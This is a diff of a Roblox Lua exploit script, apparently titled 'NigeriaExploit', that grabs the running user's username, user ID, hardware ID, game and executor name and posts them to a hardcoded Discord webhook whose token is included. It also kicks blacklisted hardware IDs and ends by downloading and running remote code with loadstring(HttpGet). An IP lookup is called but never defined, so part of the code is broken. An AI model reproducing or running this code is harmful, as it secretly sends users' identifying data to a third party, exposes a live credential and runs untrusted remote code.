@@ -189,123 +189,89 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
 local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then
+    warn("LocalPlayer not found, script should run in a LocalScript context.")
+    return
+end
+
 local UserId = LocalPlayer.UserId
 local DisplayName = LocalPlayer.DisplayName
 local Username = LocalPlayer.Name
 local HWID = RbxAnalyticsService:GetClientId()
+
+-- Attempt to get game name, fallback to "Unknown Game"
 local GameName = "Unknown Game"
-pcall(
-    function()
-        GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    end
-)
+pcall(function()
+    GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- A dummy GetIp function, replace with your actual IP getter if you have one
+
+-- Executor detection function with safe checks
 local function detectExecutor()
-    if syn then
-        return "Synapse X"
-    end
-    if secure_load then
-        return "Sentinel"
-    end
-    if pebc_execute then
-        return "ProtoSmasher"
-    end
-    if KRNL_LOADED then
-        return "Krnl"
-    end
-    if is_sirhurt_closure then
-        return "SirHurt"
-    end
+    if syn then return "Synapse X" end
+    if secure_load then return "Sentinel" end
+    if pebc_execute then return "ProtoSmasher" end
+    if KRNL_LOADED then return "Krnl" end
+    if is_sirhurt_closure then return "SirHurt" end
     if identifyexecutor then
-        return identifyexecutor()
+        local success, result = pcall(identifyexecutor)
+        if success and result then return result end
     end
-    if _G.fluxus then
-        return "Fluxus"
+    if _G.fluxus then return "Fluxus" end
+    if _G.delta then return "Delta" end
+    if _G.WRD_DEBUG or _G.WEAREDEVS then return "WeAreDevs (WRD)" end
+    if _G.oxygenU then return "Oxygen U" end
+    if _G.scriptware then return "Script-Ware" end
+    if get_luavm_flags then return "Script-Ware (Alternative)" end
+    if _G.JJSploit then return "JJSploit" end
+    if _G.Celestial then return "Celestial" end
+    if _G.Protosmasher then return "ProtoSmasher (Alternative)" end
+    if _G.Vega then return "Vega X" end
+    if _G.Hydrogen then return "Hydrogen" end
+    if _G.Arcade then return "Arcade" end
+    if _G.Shadow then return "Shadow" end
+    if _G.Potassium then return "Potassium" end
+    local success, env = pcall(getrenv)
+    if success and env then
+        if env.Potassium or env.executorName == "Potassium" then return "Potassium" end
     end
-    if _G.delta then
-        return "Delta"
-    end
-    if _G.WRD_DEBUG or _G.WEAREDEVS then
-        return "WeAreDevs (WRD)"
-    end
-    if _G.oxygenU then
-        return "Oxygen U"
-    end
-    if _G.scriptware then
-        return "Script-Ware"
-    end
-    if get_luavm_flags then
-        return "Script-Ware (Alternative)"
-    end
-    if _G.JJSploit then
-        return "JJSploit"
-    end
-    if _G.Celestial then
-        return "Celestial"
-    end
-    if _G.Protosmasher then
-        return "ProtoSmasher (Alternative)"
-    end
-    if _G.Vega then
-        return "Vega X"
-    end
-    if _G.Hydrogen then
-        return "Hydrogen"
-    end
-    if _G.Arcade then
-        return "Arcade"
-    end
-    if _G.Shadow then
-        return "Shadow"
-    end
-    if _G.Potassium or (pcall(getrenv) and getrenv().Potassium or getrenv().executorName == "Potassium") then
-        return "Potassium"
-    end
-    if gethiddenproperty or sethiddenproperty then
-        return "Unknown (Hidden Property Access)"
-    end
-    if getrawmetatable or setrawmetatable then
-        return "Unknown (Raw Metatable Access)"
-    end
-    if newcclosure or islclosure then
-        return "Unknown (C-closure Support)"
-    end
-    if hookfunction then
-        return "Unknown (Function Hooking)"
-    end
-    if protect_gui or protect_script then
-        return "Unknown (Protection API)"
-    end
-    if getconnections then
-        return "Unknown (Connection Spy)"
-    end
-    if getgenv then
-        return "Unknown (Generic Global Environment)"
-    end
-    if getfenv(0) and getfenv(0).setclipboard then
-        return "Unknown (Clipboard via setfenv)"
-    end
-    if HttpGet or HttpPost then
-        return "Unknown (Generic HTTP functions)"
-    end
+    if gethiddenproperty or sethiddenproperty then return "Unknown (Hidden Property Access)" end
+    if getrawmetatable or setrawmetatable then return "Unknown (Raw Metatable Access)" end
+    if newcclosure or islclosure then return "Unknown (C-closure Support)" end
+    if hookfunction then return "Unknown (Function Hooking)" end
+    if protect_gui or protect_script then return "Unknown (Protection API)" end
+    if getconnections then return "Unknown (Connection Spy)" end
+    if getgenv then return "Unknown (Generic Global Environment)" end
+    if getfenv and getfenv(0) and getfenv(0).setclipboard then return "Unknown (Clipboard via setfenv)" end
+    if HttpGet or HttpPost then return "Unknown (Generic HTTP functions)" end
     return "Unknown"
 end
-local blacklistedHWIDs = {["abc123"] = true, ["def456"] = true, ["spoofedhackerID"] = true}
+
+local blacklistedHWIDs = {
+    ["abc123"] = true,
+    ["def456"] = true,
+    ["spoofedhackerID"] = true,
+}
+
 local function isBlacklisted()
     if blacklistedHWIDs[HWID] then
         warn("Blacklisted HWID detected: " .. HWID)
-        LocalPlayer:Kick("je HWID staat op blacklist dusss ermmmmm")
+        LocalPlayer:Kick("Je HWID staat op blacklist dusss ermmmmm")
         return true
     end
     return false
 end
+
 local function createWebhookData()
     local executor = detectExecutor()
     local data = {
-        ["embeds"] = {
+        embeds = {
             {
-                ["title"] = "NigeriaExploit",
-                ["description"] = string.format(
+                title = "NigeriaExploit",
+                description = string.format(
                     "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
                     Username,
                     DisplayName,
@@ -313,34 +279,63 @@ local function createWebhookData()
                     HWID,
                     GameName,
                     executor,
-                    GetIp
+                    GetIp()
                 ),
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
-                        UserId .. "&width=150&height=150&format=png"
+                thumbnail = {
+                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
                 },
-                ["color"] = 16753920,
-                ["footer"] = {["text"] = os.date("Logged at %Y-%m-%d %H:%M:%S")}
+                color = 16753920,
+                footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
             }
         }
     }
     return HttpService:JSONEncode(data)
 end
+
 local function sendWebhook(url, data)
-    local headers = {["Content-Type"] = "application/json"}
+    local headers = { ["Content-Type"] = "application/json" }
     local requestFunc = http_request or request or HttpPost or (syn and syn.request)
     if requestFunc then
-        requestFunc({Url = url, Method = "POST", Headers = headers, Body = data})
+        -- Different exploits have different request formats:
+        if syn and syn.request then
+            syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = data
+            })
+        elseif http_request then
+            http_request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = data
+            })
+        elseif request then
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = data
+            })
+        elseif HttpPost then
+            -- HttpPost is usually a function that takes URL and body separately
+            HttpPost(url, data)
+        else
+            warn("No compatible HTTP request function found.")
+        end
     else
         warn("No supported HTTP request function found.")
     end
 end
-local webhookUrl =
-    "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
+
+local webhookUrl = "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
+
 if not isBlacklisted() then
     local webhookData = createWebhookData()
     sendWebhook(webhookUrl, webhookData)
 end
+
 print("Made By trex.gg en eclipse")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
